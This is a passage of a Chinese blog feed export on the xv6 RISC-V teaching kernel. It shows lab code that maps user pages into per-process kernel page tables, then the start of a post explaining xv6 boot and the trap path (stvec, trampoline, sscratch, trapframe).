class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(newsz &gt; PLIC)</span><br><span class="line">    panic(<span class="string">&quot;ukvmmap: newsze &gt;= PLIC\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  oldsz = PGROUNDUP(oldsz);</span><br><span class="line">  <span class="keyword">for</span>(a = oldsz; a &lt; newsz; a += PGSIZE)&#123;</span><br><span class="line">    pte = walk(up, a, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(pte == <span class="number">0</span>) &#123;</span><br><span class="line">      ukvmunmap(kp, a, oldsz);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mappages(kp, a, PGSIZE, PTE2PA(*pte), PTE_FLAGS(*pte) ^ PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">      ukvmunmap(kp, a, oldsz);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Unmap user pages in kernel pagetable to bring the process size </span></span><br><span class="line"><span class="comment">// from oldsz to newsz.  oldsz and newsz need not be page-aligned, nor does newsz</span></span><br><span class="line"><span class="comment">// need to be less than oldsz.  oldsz can be larger than the actual</span></span><br><span class="line"><span class="comment">// process size.  Returns the new process size.</span></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">ukvmunmap</span><span class="params">(<span class="type">pagetable_t</span> kp, uint64 oldsz, uint64 newsz)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(newsz &gt;= oldsz)</span><br><span class="line">    <span class="keyword">return</span> oldsz;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(PGROUNDUP(newsz) &lt; PGROUNDUP(oldsz))&#123;</span><br><span class="line">    <span class="type">int</span> npages = (PGROUNDUP(oldsz) - PGROUNDUP(newsz)) / PGSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the physical memory will be freed in uvmdealloc</span></span><br><span class="line">    uvmunmap(kp, PGROUNDUP(newsz), npages, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> newsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里额外说明一下几个注意点</p><ol><li>映射的虚拟地址有上限——根据博客开始时<strong>S-mode</strong>内存布局，其<strong>boot ROM</strong>部分和<strong>CLINT</strong>部分在启动后可以覆盖掉；而用户程序基址为<strong>0</strong>，则为了与原本的<strong>S-mode</strong>内核内存布局冲突，其添加的虚拟地址上限为<strong>PLIC</strong></li><li>添加相关的的映射关系，其属性应该为<strong>PTE_S</strong>，即仅<strong>S-mode</strong>可接触——因为该页表是切换到<strong>S-mode</strong>才会使用的，避免越权访问</li><li>删除<strong>S-mode</strong>内核页表相关的映射关系时，无需释放掉物理内存——对应的物理内存会在<strong>U-mode</strong>释放页表资源时进行释放</li></ol><p>其次，则是在用户空间页表被更改时，同样更改<strong>S-mode</strong>的<strong>process identical</strong>的内核页表的相关表项<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="comment">// Set up first user process.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">userinit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// allocate one user page and copy init&#x27;s instructions</span></span><br><span class="line">  <span class="comment">// and data into it.</span></span><br><span class="line">  uvminit(p-&gt;pagetable, initcode, <span class="keyword">sizeof</span>(initcode));</span><br><span class="line">  p-&gt;sz = PGSIZE;</span><br><span class="line">  ukvmmap(p-&gt;kernel_pagetable, p-&gt;pagetable, <span class="number">0</span>, p-&gt;sz);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prepare for the very first &quot;return&quot; from kernel to user.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = <span class="number">0</span>;      <span class="comment">// user program counter</span></span><br><span class="line">  p-&gt;trapframe-&gt;sp = PGSIZE;  <span class="comment">// user stack pointer</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a new process, copying the parent.</span></span><br><span class="line"><span class="comment">// Sets up child kernel stack to return as if from fork() system call.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// Copy user memory from parent to child.</span></span><br><span class="line">  <span class="keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(np);</span><br><span class="line">    release(&amp;np-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  np-&gt;sz = p-&gt;sz;</span><br><span class="line">  <span class="comment">// Map user memory from parent to child in kernel pagetable</span></span><br><span class="line">  <span class="keyword">if</span>(ukvmmap(np-&gt;kernel_pagetable, np-&gt;pagetable, <span class="number">0</span>, np-&gt;sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    freeproc(np);</span><br><span class="line">    release(&amp;np-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  np-&gt;parent = p;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// copy saved user registers.</span></span><br><span class="line">  *(np-&gt;trapframe) = *(p-&gt;trapframe);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/exec.c</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">exec</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// Load program into memory.</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>, off=elf.phoff; i&lt;elf.phnum; i++, off+=<span class="keyword">sizeof</span>(ph))&#123;</span><br><span class="line">    <span class="keyword">if</span>(readi(ip, <span class="number">0</span>, (uint64)&amp;ph, off, <span class="keyword">sizeof</span>(ph)) != <span class="keyword">sizeof</span>(ph))</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(ph.type != ELF_PROG_LOAD)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span>(ph.memsz &lt; ph.filesz)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(ph.vaddr + ph.memsz &lt; ph.vaddr)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    uint64 sz1;</span><br><span class="line">    <span class="keyword">if</span>((sz1 = uvmalloc(pagetable, sz, ph.vaddr + ph.memsz)) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    sz = sz1;</span><br><span class="line">    <span class="keyword">if</span>(ph.vaddr % PGSIZE != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(loadseg(pagetable, ph.vaddr, ip, ph.off, ph.filesz) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  uint64 oldsz = p-&gt;sz;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Commit to the user image.</span></span><br><span class="line">  oldpagetable = p-&gt;pagetable;</span><br><span class="line">  p-&gt;pagetable = pagetable;</span><br><span class="line">  p-&gt;sz = sz;</span><br><span class="line">  p-&gt;trapframe-&gt;epc = elf.entry;  <span class="comment">// initial program counter = main</span></span><br><span class="line">  p-&gt;trapframe-&gt;sp = sp; <span class="comment">// initial stack pointer</span></span><br><span class="line">  proc_freepagetable(oldpagetable, oldsz);</span><br><span class="line">  ukvmunmap(p-&gt;kernel_pagetable, oldsz, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Map the user memory into kernel pagetable</span></span><br><span class="line">  <span class="keyword">if</span>(ukvmmap(p-&gt;kernel_pagetable, p-&gt;pagetable, <span class="number">0</span>, p-&gt;sz) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// print the first process&#x27;s page table</span></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;pid == <span class="number">1</span>)</span><br><span class="line">    vmprint(p-&gt;pagetable);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> argc; <span class="comment">// this ends up in a0, the first argument to main(argc, argv)</span></span><br><span class="line"></span><br><span class="line"> bad:</span><br><span class="line">  <span class="keyword">if</span>(pagetable)</span><br><span class="line">    proc_freepagetable(pagetable, sz);</span><br><span class="line">  <span class="keyword">if</span>(ip)&#123;</span><br><span class="line">    iunlockput(ip);</span><br><span class="line">    end_op();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="comment">// Grow or shrink user memory by n bytes.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on failure.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">growproc</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint sz, newsz;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  newsz = sz = p-&gt;sz;</span><br><span class="line">  <span class="keyword">if</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>((newsz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == <span class="number">0</span> ||</span><br><span class="line">      ukvmmap(p-&gt;kernel_pagetable, p-&gt;pagetable, sz, sz + n) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(n &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    newsz = uvmdealloc(p-&gt;pagetable, sz, sz + n);</span><br><span class="line">    ukvmunmap(p-&gt;kernel_pagetable, sz, sz + n);</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;sz = newsz;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而对于<strong>proc_freepagetable</strong>，其无需进行更改，保持前一个<strong>lab</strong>的实现即可——因为前一个<strong>lab</strong>已经实现了释放整个<strong>process identical</strong>的内核页表页表项，并且不释放最终的物理内存。而这正符合前面的分析</p><h3 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=<span class="string">&quot;usertests&quot;</span> grade</span><br></pre></td></tr></table></figure><br><img src="usertest_copyin实验结果.png" alt="Simplify copyin/copyinstr实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xv6-二</title>
      <link href="/2022/05/21/xv6-%E4%BA%8C/"/>
      <url>/2022/05/21/xv6-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客探索一下xv6内核的系统调用过程</p><h1 id="xv6启动流程"><a href="#xv6启动流程" class="headerlink" title="xv6启动流程"></a>xv6启动流程</h1><p>参考<a href="https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf">xv6-book</a>，可以对xv6的启动过程有非常清晰的认识，这对于理解linux内核的启动大有裨益</p><p>首先，写在<strong>ROM</strong>中的<strong>boot loader</strong>，将内核装载入内存中，并将执行流跳转到固定的入口点(代码写死在ROM中，自然跳转的入口点也是固定的)</p><p>因此，编译内核时，需要将内核的入口函数<strong>_entry</strong>(kernel/entry.S:6)编译到<strong>boot loader</strong>指定的地址处(xv6是0x80000000)</p><p>而为了<em>让生活更美好</em>，<strong>_entry</strong>函数使用汇编指令初始化栈后，跳转到使用C语言编写的<strong>start</strong>(kernel/start.c:20)。<br><strong>start</strong>函数的主要工作就是设置<strong>CSRs</strong>(control and state registers)，从而切换到<strong>S-mode</strong>(supervisor mode)，并将执行流设置成<strong>main</strong>(kernel/main.c:10)。<strong>start</strong>函数实现的非常巧妙，其通过设置<strong>CSRs</strong>，伪造一个异常处理保存的上下文，其上下文的特权级是<strong>S-mode</strong>，PC是<strong>main</strong>。执行<strong>mret</strong>指令后，通过恢复上下文，完成特权级和执行流的转换</p><p>在<strong>main</strong>函数中，即初始化内核的子系统，并执行<strong>userinit</strong>(kernel/proc.c:211)，创建第一个进程。<br><strong>userinit</strong>函数申请进程描述符和虚拟地址空间等资源，将<strong>initcode.S</strong>(user/initcode.S:1)的汇编代码映射入进程中并设置为进程入口函数。而<strong>initcode.S</strong>中的汇编代码很简单，伪代码如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">&quot;/init&quot;</span>, &#123;<span class="string">&quot;/init&quot;</span>, <span class="number">0</span>&#125;);</span><br><span class="line"><span class="built_in">exit</span>()</span><br></pre></td></tr></table></figure></p><p>而<strong>/init</strong>是user/init.c编译的可执行程序，其初始化中断设备，初始化文件描述符，并启动<strong>sh</strong></p><h1 id="xv6的trap过程"><a href="#xv6的trap过程" class="headerlink" title="xv6的trap过程"></a>xv6的trap过程</h1><p>实际上，合理推测任何架构下的<strong>trap</strong>(陷入)过程都是类似的</p><ol><li>硬件执行必要的寄存器更改，并跳转到相关向量处</li><li>汇编形式的向量代码会执行C形式的服务例程</li><li>从服务例程返回到剩余的向量代码</li><li>硬件执行必要的寄存器更改，返回到<strong>trap</strong>前上下文执行</li></ol><p>之所以需要硬件参入，是避免用户态程序参入<strong>陷入</strong>执行过程，从而避免某些软件通过<strong>陷入</strong>执行恶意代码<br>之所以需要有汇编形式的参入，是为了方便符合CPU架构的对于<strong>trap</strong>的某些硬件接口约束</p><h2 id="硬件处理"><a href="#硬件处理" class="headerlink" title="硬件处理"></a>硬件处理</h2><p>当用户态执行<strong>ecall</strong>指令调用系统调用，或设备产生<strong>interrupt</strong>(中断)，或指令引发<strong>exception</strong>(异常)，此时会<strong>trap</strong>，即陷入内核。RISC-V架构的硬件会立马执行如下步骤</p><ol><li>如果是设备中断，并且<strong>sstatus</strong>(Supervisor Status Register)的<strong>SIE</strong>(Supervisor Interrupt Enable)比特是被清空的，则不执行下属操作(相当于被无视)</li><li>清除<strong>sstatus</strong>(Supervisor Status Register)的<strong>SIE</strong>(Supervisor Interrupt Enable)比特，关闭中断</li><li>将<strong>pc</strong>寄存器复制到<strong>sepc</strong>(Supervisor Exception Program Counter)</li><li>将当前特权级保存在<strong>sstatus</strong>(Supervisor Status Register)的<strong>SPP</strong>(Supervisor Previous Privilege)比特</li><li>设置<strong>scause</strong>(Supervisor Cause)，用来表示<strong>trap</strong>的原因</li><li>将当前特权级更改为<strong>S-mode</strong></li><li>将<strong>stvec</strong>(Supervisor Trap Vector Base Address)复制到<strong>pc</strong>寄存器</li><li>开始执行新的<strong>pc</strong>寄存器的执行流</li></ol><p>可以看到，riscv硬件处理的步骤并不是很多，主要就是保存了当前的特权级和pc寄存器，并切换了新的特权级和pc寄存器</p><p>而诸如页表切换、栈切换等<strong>x86</strong>架构中硬件处理的部分，则都交给内核完成</p><p>需要特别注意的是，每一个CPU都有一组上述的寄存器，也就是同一时间可以有多个CPU在处理中断</p><h2 id="汇编形式的向量代码"><a href="#汇编形式的向量代码" class="headerlink" title="汇编形式的向量代码"></a>汇编形式的向量代码</h2><p>之所以称为向量代码，是因为在<strong>x86</strong>架构下，其新<strong>pc</strong>寄存器值是一个函数指针数组中的元素。这里虽然并不是相似的机制(直接将固定的地址赋给<strong>pc</strong>，而非从数组中索引元素)，但是仍然继承了类似的名称</p><h3 id="stvec"><a href="#stvec" class="headerlink" title="stvec"></a>stvec</h3><p><strong>stvec</strong>(Supervisor Trap Vector Base Address)寄存器在<strong>S-mode</strong>和<strong>U-mode</strong>的虚拟地址并不一样，且其实际指向的物理地址也不一样</p><h4 id="S-mode"><a href="#S-mode" class="headerlink" title="S-mode"></a>S-mode</h4><p>在<strong>S-mode</strong>下，<strong>stvec</strong>(Supervisor Trap Vector Base Address)寄存器在<strong>main</strong>(kernel/main.c:11)中初始化，调用<strong>trapinithart</strong>(kernel/trap.c:25)，将<strong>stvec</strong>寄存器的值初始化为<strong>kernelvec</strong>(kernel/kernelvec.S:10)</p><p>在直白一些，在<strong>S-mode</strong>下<strong>trap</strong>，硬件处理后会跳转至<strong>kernelvec</strong>处执行</p><h4 id="U-mode"><a href="#U-mode" class="headerlink" title="U-mode"></a>U-mode</h4><p><strong>U-mode</strong>下找<strong>stvec</strong>(Supervisor Trap Vector Base Address)寄存器初始化的位置略难，因为还没开始认真分析创建进程的流程(会在后面进行分析)</p><p>当创建用户进程时，在<strong>allocproc</strong>(kernel/proc.c:127)函数中，其会指定用户进程执行的第一条指令为<strong>forkret</strong>(kernel/proc.c:534)。在该执行流中，其调用的<strong>usertrapret</strong>(kernel/trap.c:100<del>，剧透一下，每次<strong>U-mode</strong>进程从<strong>trap</strong>返回时，也会调用<strong>usertrapret</strong></del>)会初始化<strong>stvec</strong>(Supervisor Trap Vector Base Address)寄存器，将<strong>stvec</strong>寄存器的值初始化为<strong>TRAMPOLINE + (uservec - trampoline)</strong></p><p>其相关的符号如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//kernel/memlayout.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRAMPOLINE (MAXVA - PGSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//kernel/trampoline.S</span></span><br><span class="line">.globl trampoline</span><br><span class="line">trampoline:</span><br><span class="line">.align <span class="number">4</span></span><br><span class="line">.globl uservec</span><br><span class="line">uservec:    </span><br><span class="line"></span><br><span class="line"><span class="comment">//kernel/proc.c</span></span><br><span class="line"><span class="keyword">if</span>(mappages(pagetable, TRAMPOLINE, PGSIZE,</span><br><span class="line">            (uint64)trampoline, PTE_R | PTE_X) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p>因此，实际上<strong>stvec</strong>值初始化为<strong>uservec</strong>(kernel/trampoline.S:16)</p><p>在直白一些，在<strong>U-mode</strong>下<strong>trap</strong>，硬件处理后会跳转至<strong>uservec</strong>处执行</p><h3 id="汇编代码"><a href="#汇编代码" class="headerlink" title="汇编代码"></a>汇编代码</h3><p>对于<strong>S-mode</strong>和<strong>U-mode</strong>，有不同的入口地址，自然其功能有少许不同</p><h4 id="S-mode-1"><a href="#S-mode-1" class="headerlink" title="S-mode"></a>S-mode</h4><p><strong>S-mode</strong>的这部分代码相对比较简单，在内核栈中保存所有的寄存器，然后调用<strong>kerneltrap</strong>(kernel/trap.c:133)的服务例程<br>其不涉及到页表变换或栈切换</p><h4 id="U-mode-1"><a href="#U-mode-1" class="headerlink" title="U-mode"></a>U-mode</h4><p><strong>U-mode</strong>这部分的代码相对来说更复杂一些，因为其需要实现的功能更多——切换页表、切换栈并保存寄存器</p><p>其比较麻烦的点在于涉及到的细节较多</p><p>为了良好的隔离性，进程在<strong>U-mode</strong>和在<strong>S-mode</strong>使用不同的栈和页表<br>而进程在陷入内核时，需要可以快速找到其对应的<strong>内核栈</strong>和<strong>内核页表</strong>，并完成切换。切换会导致一些小问题——相同的虚拟地址在不同的页表中可能会映射向不同的物理地址(例如切换的一瞬间，<strong>pc</strong>寄存器指向的指令是否发生变化等)；如何在<strong>S-mode</strong>地址空间中找到保存的<strong>U-mode</strong>的上下文等</p><p>解决该问题的一个关键就是riscv提供的<strong>sscratch</strong>(Supervisior Scratch)寄存器——其保存<strong>U-mode</strong>地址空间下存储的<strong>U-mode</strong>上下文(因为riscv只支持寄存器间接访存，没有额外的寄存器，如何将所有寄存器保存到指定内存中)</p><p>其整个机制如下所示</p><ol><li>在内核初始化时，将物理地址<strong>uservec</strong>(前面<strong>U-mode</strong>汇编代码的入口处)映射到<strong>S-mode</strong>地址空间的<strong>TRAMPOLINE</strong>。根据前面的分析，即此时<strong>TRAMPOLINE</strong>虚拟地址在不同的页表中指向相同的物理地址，从而即使切换也不改变内容(解决切换瞬间可能执行指令不一致问题)(kernel/vm.c:47)</li><li>在创建用户进程中，在设置页表时，将物理地址<strong>uservec</strong>映射到<strong>U-mode</strong>地址空间中的<strong>TRAMPOLINE</strong>地址(即此时<strong>TRAMPOLINE</strong>虚拟地址在不同的页表中指向相同的物理地址)(kernel/proc.c:171)。将申请的<strong>trapframe</strong>物理地址映射到<strong>S-mode</strong>地址空间中的对应地址(kernel/proc.c:111)和<strong>U-mode</strong>地址空间中的对应地址(kernel/proc.c:178)，不需要像<strong>TRAMPOLINE</strong>一样将虚拟地址映射到相同的物理地址，只需要<strong>S-mode</strong>和<strong>U-mode</strong>，各有一个虚拟地址映射到相同的物理地址即可</li><li>在用户进程刚刚创建完，从<strong>S-mode</strong>返回之前，将<strong>内核页表</strong>物理地址、<strong>内核栈</strong>在<strong>S-mode</strong>地址空间的虚拟地址，在<strong>S-mode</strong>地址空间中存储到<strong>trapframe</strong>物理页上(由于前面的映射关系，<strong>U-mode</strong>地址空间的<strong>trapframe</strong>对应的虚拟地址处的值也变更了)(kernel/trap.c:104). 并将<strong>U-mode</strong>地址空间的<strong>trapframe</strong>地址放置在<strong>sscratch</strong>(Supervisior Scratch)中(kernel/trampoline.S:137)</li><li>当用户进程<strong>trap</strong>时，通过<strong>sscratch</strong>，即可将当前上下文保存到<strong>trapframe</strong>中，并从<strong>trapframe</strong>中加载<strong>内核页表</strong>和<strong>内核栈</strong>(kernel/trampoline.S:29)，并调用<strong>usertrap</strong>(kernel/trap.c:36)</li></ol><p>在直白一些，通过页表映射，可以在<strong>U-mode</strong>和<strong>S-mode</strong>地址空间中，映射<strong>trapframe</strong>页用来保存上下文、内核栈<strong>S-mode</strong>地址和内核页表，从而在<strong>U-mode</strong>地址空间中通过<strong>sscratch</strong>寄存器访问<strong>trapframe</strong>；在<strong>S-mode</strong>地址空间通过<strong>struct proc</strong>全局变量访问<strong>trapframe</strong>。通过将<strong>U-mode</strong>和<strong>S-mode</strong>地址空间的<strong>TRAMPOLINE</strong>虚拟地址都映射到<strong>uservec</strong>处，从而确保在切换地址空间时，执行的相关汇编指令不会更改</p><h2 id="服务例程"><a href="#服务例程" class="headerlink" title="服务例程"></a>服务例程</h2><p>当通过汇编代码，完成了硬件接口的约束后，<strong>life is better</strong></p><p>此刻即可以通过<strong>C</strong>，实现所需的功能</p><p>此时已经处于内核栈，并且切换到内核页表。<strong>S-mode</strong>和<strong>U-mode</strong>执行不同的服务例程</p><h3 id="从S-mode进行trap"><a href="#从S-mode进行trap" class="headerlink" title="从S-mode进行trap"></a>从S-mode进行trap</h3><p>如果从<strong>S-mode</strong>进行<strong>trap</strong>，其必然不会主动<strong>trap</strong>，则只需要考虑设备中断即可。</p><p>因为可能会被调度(如果是时间中断)，则前面<strong>硬件处理</strong>部分保存的<strong>sepc</strong>(Supervisor Exception Program Counter)和<strong>sstatus</strong>(Supervisor Status Register)可能会被覆盖，则将其保存在内核栈中(kernel/trap.c:137)，然后执行相关的程序即可</p><p>当执行完服务例程后，其恢复前面保存的相关寄存器质(kernel/trap.c:158)，继续执行<strong>kernelvec.S</strong>后面的部分即可(kernel/kernelvec.S:51)</p><h3 id="从U-mode进行trap"><a href="#从U-mode进行trap" class="headerlink" title="从U-mode进行trap"></a>从U-mode进行trap</h3><p>类似于从<strong>S-mode</strong>进行<strong>trap</strong>，由于可能会被调度(时间中断),则前面<strong>硬件处理</strong>部分保存的<strong>sepc</strong>(Supervisor Exception Program Counter)和<strong>sstatus</strong>(Supervisor Status Register)可能会被覆盖，但这里并没有保存在内核栈中(虽然也可以，但是因为实现原因没有)，而是保存在<strong>trapframe</strong>中(kernel/trap.c:51)</p><p>除此之外，由于可能发生<strong>S-mode</strong>的<strong>trap</strong>，因此需要更改<strong>stvec</strong>(Supervisor Trap Vector Base Address)为<strong>kernelvec</strong>(kernel/trap.c:46)，确保再次陷入时仍然是正确的</p><p>当完成服务例程后，其执行<strong>usertrapret</strong>(kernel/trap.c:89)，恢复前面保存的值，同时重置一些关键信息(一方面可能由于进程调度更改的CPU敏感信息，另一方面需要清空内核栈，还有刚刚创建完的用户进程的初始化)，并最后执行<strong>userret</strong>(kernel/trampoline.S:88)</p><p>由于<strong>U-mode</strong>的特殊性，其<strong>trap</strong>需要解决<strong>U-mode</strong>切换到<strong>S-mode</strong>再切换为<strong>U-mode</strong>的过程，并且创建用户进程也涉及<strong>S-mode</strong>切换为<strong>U-mode</strong>，所以会略显复杂</p><h2 id="汇编形式的向量代码2"><a href="#汇编形式的向量代码2" class="headerlink" title="汇编形式的向量代码2"></a>汇编形式的向量代码2</h2><p>对称的，从<strong>trap</strong>退出到时，同样需要满足相关的硬件接口约束</p><h3 id="返回到S-mode"><a href="#返回到S-mode" class="headerlink" title="返回到S-mode"></a>返回到S-mode</h3><p>也就是前面<strong>汇编形式的向量代码</strong>的反向操作即可，从内核栈中恢复上下文即可(kernel/kernelvec.S:51)</p><h3 id="返回到U-mode"><a href="#返回到U-mode" class="headerlink" 